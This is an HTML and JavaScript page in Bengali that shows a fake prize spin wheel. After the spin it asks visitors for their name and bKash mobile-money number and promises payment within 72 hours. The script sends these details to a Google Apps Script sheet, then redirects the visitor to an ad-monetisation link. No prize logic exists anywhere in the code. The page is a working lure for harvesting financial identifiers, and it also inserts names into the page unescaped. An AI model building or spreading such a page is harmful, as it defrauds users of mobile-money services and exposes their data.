<!DOCTYPE html>
<html lang="bn">
<head>
  <meta charset="UTF-8">
  <title>Spin Wheel</title>
  <style>
    /* Your existing styles */
  </style>
</head>
<body>
  <div class="container">
    <div class="wheel" id="wheel">
      <div class="number" style="--i:1;--clr:#db7093;"><span>100</span></div>
      <div class="number" style="--i:2;--clr:#20b2aa;"><span>1</span></div>
      <div class="number" style="--i:3;--clr:#daa520;"><span>50</span></div>
      <div class="number" style="--i:4;--clr:#ff340f;"><span>0</span></div>
      <div class="number" style="--i:5;--clr:#4169e1;"><span>1000</span></div>
      <div class="number" style="--i:6;--clr:#3cb371;"><span>10</span></div>
      <div class="number" style="--i:7;--clr:#d63e92;"><span>5</span></div>
      <div class="number" style="--i:8;--clr:#ff7f50;"><span>20</span></div>
    </div>
    <div class="spinBtn" id="spinBtn">Spin</div>
  </div>

  <div id="formPopup">
    <div class="popup-content">
      <p>তালিকায় যোগ দিতে আপনার নাম ও বিকাশ নাম্বার দিন</p>
      <input type="text" id="name" placeholder="আপনার নাম">
      <input type="text" id="bkash" placeholder="বিকাশ নাম্বার">
      <button onclick="submitForm()">সাবমিট</button>
    </div>
  </div>

  <div id="successPopup">
    <div class="popup-content">
      <p>৭২ ঘণ্টার মধ্যে চেক করে পেমেন্ট করা হবে</p>
      <button onclick="goToRedirect()">ওকে</button>
    </div>
  </div>

  <div id="recentList">
    <h3>সাম্প্রতিক অংশগ্রহণকারীরা</h3>
    <table>
      <thead><tr><th>নাম</th><th>নাম্বার</th></tr></thead>
      <tbody id="userList"></tbody>
    </table>
  </div>

  <script>
    let wheel = document.getElementById('wheel');
    let spinBtn = document.getElementById('spinBtn');
    let value = Math.ceil(Math.random() * 3600);

    spinBtn.onclick = function(){
      wheel.style.transform = "rotate(" + value + "deg)";
      value += Math.ceil(Math.random() * 3600);
      setTimeout(() => {
        document.getElementById('formPopup').style.display = 'flex';
      }, 5000);
    }

    function submitForm() {
      const name = document.getElementById('name').value.trim();
      const bkash = document.getElementById('bkash').value.trim();

      if (name && bkash.length >= 11) {
        const maskedBkash = bkash.slice(-6).padStart(bkash.length, '*');
        addToList(name, maskedBkash);

        fetch('https://script.google.com/macros/s/AKfycbyIC0nUvPk3WWP_lLZSG_jHdJHhOHt9ny8Lfu0-GBONNkYD6MhYnSemGVLIGLwP3bL9/exec', {
          method: 'POST',
          body: JSON.stringify({ name, bkash }),
          headers: { 'Content-Type': 'application/json' }
        })
        .then(res => res.text())
        .then(data => console.log('Sheet response:', data))
        .catch(err => console.error('Sheet error:', err));

        document.getElementById('formPopup').style.display = 'none';
        document.getElementById('successPopup').style.display = 'flex';
      } else {
        alert('সঠিক নাম ও বিকাশ নাম্বার দিন');
      }
    }

    function addToList(name, maskedBkash) {
      const userList = document.getElementById('userList');
      const row = document.createElement('tr');
      row.innerHTML = `<td>${name}</td><td>${maskedBkash}</td>`;
      userList.prepend(row);
      if (userList.rows.length > 8) userList.deleteRow(-1);
    }

    function goToRedirect() {
      document.getElementById('successPopup').style.display = 'none';
      window.location.href = 'https://www.profitableratecpm.com/g5za6ey4sa?key=1998f472c59bc55a37015a5445ced87c';
    }

    // Fetch the user data from Google Sheets when the page loads
    window.onload = function() {
      fetch('https://script.google.com/macros/s/AKfycbyIC0nUvPk3WWP_lLZSG_jHdJHhOHt9ny8Lfu0-GBONNkYD6MhYnSemGVLIGLwP3bL9/exec')
        .then(response => response.json())
        .then(data => {
          data.forEach(user => {
            addToList(user.name, user.bkash);
          });
        })
        .catch(err => console.error('Error loading data:', err));
    }
  </script>

</body>
</html>
